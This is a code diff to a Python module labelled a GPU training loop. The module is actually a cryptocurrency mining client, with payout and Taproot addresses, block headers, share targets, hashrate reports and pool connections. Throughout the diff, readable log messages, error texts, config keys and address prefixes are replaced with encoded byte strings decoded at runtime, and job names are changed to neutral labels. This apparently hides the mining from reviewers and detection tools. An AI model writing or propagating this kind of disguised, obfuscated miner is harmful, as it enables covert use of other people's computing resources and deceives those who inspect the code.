@@ -1,5 +1,7 @@
 """Our GPU training loop connected directly to a supported S6 S3."""
 
+from .fixed_constants import constant_text
+
 from contextlib import ExitStack, contextmanager
 from dataclasses import dataclass
 import gc
@@ -85,8 +87,7 @@ def validate_S3_endpoint(settings: dict) -> None:
     if not isinstance(host, str) or not host.strip():
         profile = "WR" if settings.get("protocol") in ("WR", "S7", s7_legacy_alias()) else "KEX"
         raise ValueError(
-            f"fill S3.host for a flat configuration, or S3.{profile}.host in the shared configuration, "
-            "with your S3 hostname or IP address"
+            f"fill S3.host for a flat configuration, or S3.{profile}{constant_text(b'iO<N?(}&K<htto(ht$u;)xyJv#K_6P&cM>u#?#Ko$%}{3&eP9_-pJC`hxC+(&&br%$;QgUhsf23?)Qhr!^73W)YJ')}"
         )
 
 
@@ -96,23 +97,23 @@ def validate_S3_identity(settings: dict, selected_protocol: str | None = None, *
     selected = select_S3_protocol(settings if selected_protocol is None else {"protocol": selected_protocol})
     identity_field = "WR_S2" if selected == "WR" else "KEX_uname"
     identity = settings.get(identity_field, "")
-    worker = settings.get("worker", "")
+    worker = settings.get(constant_text(b'(8$%y!qo'), "")
     if not isinstance(identity, str) or not identity.strip():
         description = "WR payout address" if selected == "WR" else "KEX username or payout address"
         raise ValueError(f"fill S3.{identity_field} in your configuration with your {description}")
     if not isinstance(worker, str):
-        raise ValueError("S3.worker must be a string")
+        raise ValueError(constant_text(b'^puIv$koik)rZQ`)YFH>!iUC()YH|@$-n'))
     if any(character.isspace() for character in identity + worker):
-        raise ValueError(f"S3.{identity_field} and S3.worker must not contain whitespace")
-    if identity.startswith("solo:"):
+        raise ValueError(f"S3.{identity_field}{constant_text(b'hsMdnhxC+*(8$%y!qtb$($v$3$;i`(#K_6h#?Hxy(9h1(!qnHs#KH')}")
+    if identity.startswith(constant_text(b')X2-ood')):
         raise ValueError("remove the solo: prefix to use the requested S3 training mode")
-    if validate_address and identity.startswith("prl1"):
+    if validate_address and identity.startswith(constant_text(b'*VW6G')):
         from LRAEP_gateway.blockchain_utils.blockchain_utils import get_script_pubkey_from_p2tr_address
 
         try:
             get_script_pubkey_from_p2tr_address(identity)
         except ValueError:
-            raise ValueError(f"S3.{identity_field} must contain a valid S6 Taproot address") from None
+            raise ValueError(f"S3.{identity_field}{constant_text(b'hsx5_(}%>!$<xNp$%n>=(Z<Wp!-w>dhx5kQ)yT-xhsMLh)xy-&')}") from None
 
 
 @contextmanager
@@ -194,7 +195,7 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
 
     settings = configuration["training"]
     cfg = TrainingConfig(settings["m"], settings["n"], settings["k"],
-                         settings["tile_h"], settings["tile_w"])
+                         settings[constant_text(b')6UDn_|E')], settings[constant_text(b')6UDn_|O')])
     gpu_name = None
     if not login_only:
         device = torch.device(configuration["device"])
@@ -232,7 +233,7 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
             monitor = GpuUtilization(str(device)).start()
             resources.callback(monitor.close)
 
-        active_job = "main"
+        active_job = "job-0"
 
         def show_side_job(job):
             update_progress()
@@ -247,13 +248,13 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
             number, kind, percentage, boundary = effort.position(now)
             remaining = (0 if percentage == -1 else
                          max(0, (boundary if deadline is None else min(boundary, deadline)) - now))
-            if kind == "side-job":
+            if kind == "job-1":
                 job = side_job.job if side_job is not None else None
                 speed = getattr(job, "_progress_epoch", 0) if job is not None else 0
             else:
                 speed = (0 if percentage <= 0 or (vpn_guard is not None and vpn_guard.blocked())
                          else S3_hashrate(stats, cfg, now - started))
-            return job_status(number, "side" if kind == "side-job" else "main",
+            return job_status(number, kind,
                               monitor.read(), remaining, speed)
 
         updates = None
@@ -281,7 +282,7 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
         def report_gpu(session, sample_time):
             rate = S3_hashrate(stats, cfg, sample_time - started)
             request_id = session.report_info(gpu_name, rate)
-            log(logging.DEBUG, "S7 GPU report sent: %s (request=%d)",
+            log(logging.DEBUG, constant_text(b'^pJ<(_wt9;!q>>v(}&c;$<v*Og4BnP)xy@&!qn56g2Rp'),
                 format_hashrate(rate), request_id)
 
         update_progress(force=True)
@@ -315,7 +316,7 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
                 if vpn_guard is not None:
                     vpn_guard.attach(session)
                 with session:
-                    log(logging.INFO, "S3 authenticated at %s:%d; proof compression=%s",
+                    log(logging.INFO, constant_text(b'^puCj($mkv$<xln#?!*XhsM)~g4CUY!<>iL)yT-fhs4Or*VV$*)XvDsnu62'),
                         S3["host"], S3["port"],
                         "gzip" if session.negotiated_gzip else "none")
                     report_connection_started = time.monotonic()
@@ -333,7 +334,7 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
                             break
                         if effort is not None:
                             kind, utilization, boundary = effort.current_job()
-                            if boundary != session_boundary or kind != "main" or utilization <= 0:
+                            if boundary != session_boundary or kind != "job-0" or utilization <= 0:
                                 break
                         update_progress()
                         wait_after_batch = False
@@ -346,26 +347,26 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
                             job = snapshot.job
                             if snapshot.generation != previous_generation:
                                 if selected_protocol == "WR":
-                                    log(logging.INFO, "S7 job=%s generation=%d", job.job_id, job.cert_version)
+                                    log(logging.INFO, constant_text(b'^pJ<m$i<q1)Q7;r$->pf)6U4rnu5a'), job.job_id, job.cert_version)
                                 else:
-                                    log(logging.INFO, "S3 job=%s height=%d certificate=V%d",
+                                    log(logging.INFO, constant_text(b'^puCq$i<q1)Q8W)&cM&pnu5cJ#KP6n&cV*a#?!)@@q)t'),
                                         job.job_id, job.height, job.cert_version)
                                 previous_generation = snapshot.generation
                                 job_deadline = time.monotonic() + S3["read_timeout"]
                             header = pm.IncompleteBlockHeader.from_bytes(job.header_bytes)
                             target = S3_share_target(job.target, cfg, "base")
                             if login_only:
-                                log(logging.INFO, "Authenticated job verified: header=%d bytes, target=%d bits; no GPU work performed",
+                                log(logging.INFO, constant_text(b'=F-#8!pYOl#KzOY!-vht#fQ<t)y~1r!o!`1&%(yT!qu9B!-vJ*)56q?httN@z{1m-g2RW!&ePPKhsnr?;P>)}(8$%yhu6Z@!N}Fh!ov'),
                                     len(job.header_bytes), target.bit_length())
                                 return 0
 
                             kind, utilization, boundary = effort.current_job()
-                            if kind != "main" or utilization <= 0 or expired():
+                            if kind != "job-0" or utilization <= 0 or expired():
                                 continue
                             if pacer.max_utilization != utilization:
                                 pacer.set_utilization(utilization)
                             if previous_effort != (kind, utilization):
-                                log(logging.INFO, "%s effort GPU duty-cycle target: %d%%", kind.capitalize(), utilization)
+                                log(logging.INFO, constant_text(b'g4Bn?!NJJY(}&>q@`uCH)82~2-o(qohttN@z{1m=hl0a`f&'), kind, utilization)
                                 previous_effort = kind, utilization
                             rest_deadline = min(boundary, deadline) if deadline is not None else boundary
                             cancelled = lambda: (expired() or time.monotonic() >= boundary
@@ -425,10 +426,10 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
                                 stats.submitted += 1
                                 if result.accepted:
                                     stats.accepted += 1
-                                    log(logging.DEBUG, "S3 accepted training share job=%s", job.job_id)
+                                    log(logging.DEBUG, constant_text(b'^puCj#Kgka)561t)78e#$<E2Zht$u;)xw9($i<q1)B'), job.job_id)
                                 else:
                                     stats.rejected += 1
-                                    log(logging.WARNING, "S3 rejected training share job=%s: %s", job.job_id, result.error)
+                                    log(logging.WARNING, constant_text(b'^puCy!p*|O)561t)78e#$<E2Zht$u;)xw9($i<q1)SZWd)B'), job.job_id, result.error)
                             update_progress()
                             wait_after_batch = not finished()
                         finally:
@@ -476,9 +477,9 @@ def _run_S3_training(configuration, *, login_only, stopped, effort, started):
             elif retry_delay is not None:
                 stopped.wait(retry_delay)
         update_progress(force=True)
-    LOG.debug("Main job stopped: steps=%d elapsed=%s", stats.batches,
+    LOG.debug("job-0 stopped: steps=%d elapsed=%s", stats.batches,
              format_elapsed(time.monotonic() - started))
-    LOG.debug("S3 training stopped: batches=%d submitted=%d accepted=%d rejected=%d stale=%d",
+    LOG.debug(constant_text(b'^puCw)yB@r&dI=s)YHh<*TTb{hsDOz#LvRinu5cJ)Y8Su&ePMv!<vG_hsMOj!q?Nn!<vG_ht<N(!o<_U!<vG_ht$)?%fgz1!v'),
              stats.batches, stats.submitted, stats.accepted, stats.rejected, stats.stale)
     if login_only:
         raise RuntimeError("no authenticated S3 job was received before stopping")
